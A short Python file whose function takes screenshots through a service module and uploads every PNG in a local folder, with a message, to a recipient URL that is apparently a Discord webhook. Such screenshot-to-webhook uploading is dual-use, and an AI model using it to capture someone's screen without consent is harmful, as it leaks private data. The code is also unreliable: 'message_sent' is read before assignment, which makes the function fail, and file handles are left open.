import glob
import os
import requests

import service.Service as Service


def send_discord_message(recipient):
    Service.get_image()
    folder_name = "screenshots"
    image_files = glob.glob(os.path.join(folder_name, "*.png"))

    files = {f"file{i+1}": open(file_path, "rb") for i, file_path in enumerate(image_files)}

    if message_sent:
        return
    
    getMessage = Service.convert_to_messange()

    if not getMessage:
        return

    data = {
        "content": getMessage
    }
    response = requests.post(recipient, data=data, files=files)
    
    if response.status_code in [200, 204]:
        print(f"Sent message to {recipient}")
        message_sent = True
    else:
        print(f"Failed to send message to {recipient}, status: {response.status_code}")